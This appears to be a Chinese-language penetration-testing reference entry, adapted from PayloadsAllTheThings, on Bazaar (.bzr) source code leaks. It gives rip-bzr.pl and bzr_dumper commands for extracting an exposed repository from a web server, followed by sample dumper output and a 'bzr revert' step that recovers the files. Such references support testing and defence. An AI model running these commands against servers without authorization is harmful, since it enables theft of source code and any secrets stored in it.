# Source Code Leak Bazaar - Bazaar源码泄露

[SEARCH_KEYWORDS]
漏洞类型: Source Code Leak Bazaar bzr 源码泄露 版本控制泄露
攻击类型: Information Disclosure Source Code Access
关键词: Bazaar bzr .bzr DVCS version control source code
技术: rip-bzr bzr_dumper repository extraction
工具: rip-bzr.pl bzr_dumper dvcs-ripper

[CONTENT]

## Bazaar源码泄露概述

Bazaar(又称bzr)是一个免费的分布式版本控制系统(DVCS)。当.bzr目录暴露在Web服务器上时，攻击者可以恢复整个源代码仓库。

## 利用工具

### rip-bzr.pl

```powershell
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u http://target.com/.bzr/
```

### bzr_dumper

```powershell
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
Created a standalone tree (format: 2a)
[!] Target : http://127.0.0.1:5000/
[+] Start.
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] Finish
```

恢复源代码:

```powershell
bzr revert
 N  application.py
 N  database.py
 N  static/
```

## 参考文档

原始来源: PayloadsAllTheThings/Insecure Source Code Management/Bazaar.md